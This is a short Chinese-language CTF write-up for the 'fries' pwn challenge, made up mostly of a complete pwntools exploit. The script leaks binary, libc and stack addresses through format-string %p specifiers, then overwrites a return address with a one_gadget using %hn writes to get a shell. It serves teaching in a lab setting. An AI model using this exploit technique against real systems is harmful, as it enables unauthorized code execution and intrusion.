## fries


***

出题人：guoql

![image-20240413224545311](C:\Users\26272\AppData\Roaming\Typora\typora-user-images\image-20240413224545311.png)

本题为简单的64位格式化字符串题目，主要考察对于格式化字符串的运用能力。

简单利用one_gadget去修改返回地址即可。

```python
from pwn import *
# -------------------修改区----------------------------
context(log_level='debug',arch='amd64',os='linux')    #arch='amd64',arch='i386'
pwnfile='./fries'
elf = ELF(pwnfile)
libc = ELF('./libc.so.6')
flag=0  # 远程/本地
ip ='192.168.75.130'
port=10000
# -------------------End------------------------------

sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
it = lambda : p.interactive()
b=lambda :gdb.attach(p)
d=lambda :pause()
leak = lambda name,addr :log.success(name+"--->"+hex(addr))


if flag:
    p = remote(ip,port)
else:
    p = process(pwnfile)
    b()


payload=b'fries\x00'
sa("Emmmmm... Could you give me some fries",payload)


# 泄露binary
sa("Go get some fries on the pier",b'%25$p%17$p%31$p')
ru(b'0x')
adventure_134=int(p.recv(12),16)
binary_base=adventure_134-134-elf.symbols['adventure']
leak("binary_base",binary_base)

# 泄露libc_base
ru(b'0x')
puts_346=int(p.recv(12),16)
libc_base=puts_346-346-libc.sym['puts']
leak("libc_base",libc_base)



# 泄露栈地址
ru(b'0x')
stack_addr=int(p.recv(12),16)
location_addr=stack_addr-104
leak("location_addr",location_addr)

# one_gadget

one=[0x50a47,0xebc81,0xebc85,0xebc88,0xebce2,0xebd3f,0xebd43]
one_gadget=libc_base+one[0]
leak("one_gadget",one_gadget)



'''
 location写的位置
 loc_content写的内容
 a1 是三链位置(主要是修改第三链的内容)
 a2 是第二链位置
                    '''
def double_byte_attack(a1,a2,location_addr,content):
    
    content_1 = content & 0xffff  # 后两位
    content_2 = (content >> 16)& 0xffff # 往前推俩
    content_3 = (content >> 32)& 0xffff # 再往前推两位
    content_4 = (content >> 48)& 0xffff # 最前面两位
    leak("content_1",content_1)
    leak("content_2",content_2)
    leak("content_3",content_3)
    leak("content_4",content_4)


    location_1= location_addr & 0xffff
    location_2= (location_addr + 2)& 0xffff
    location_3= (location_addr + 4)& 0xffff
    location_4= (location_addr + 6)& 0xffff
    leak("location_1",location_1)
    leak("location_2",location_2)
    leak("location_3",location_3)
    leak("location_4",location_4)

    location=[location_1,location_2,location_3,location_4]
    loc_content=[content_1,content_2,content_3,content_4]
    for i in range(3):
        # 打第八位为rbp_16-8 也就是改成了rbp
        payload=b"%" + str(location[i]).encode("utf-8") + b"c%"+str(a1).encode("utf-8")+b"$hn\x00"
        sa("Go get some fries on the pier",payload)
        # 往第十个位置开始写one_gadget
        payload=b"%" + str(loc_content[i]).encode("utf-8") + b"c%"+str(a2).encode("utf-8")+b"$hn\x00"
        sa("Go get some fries on the pier",payload)
            


double_byte_attack(24,34,location_addr,one_gadget)
log.success("Finshed!!!! That's all")
sa("Go get some fries on the pier",b'Pwn!!\x00')


it()

```







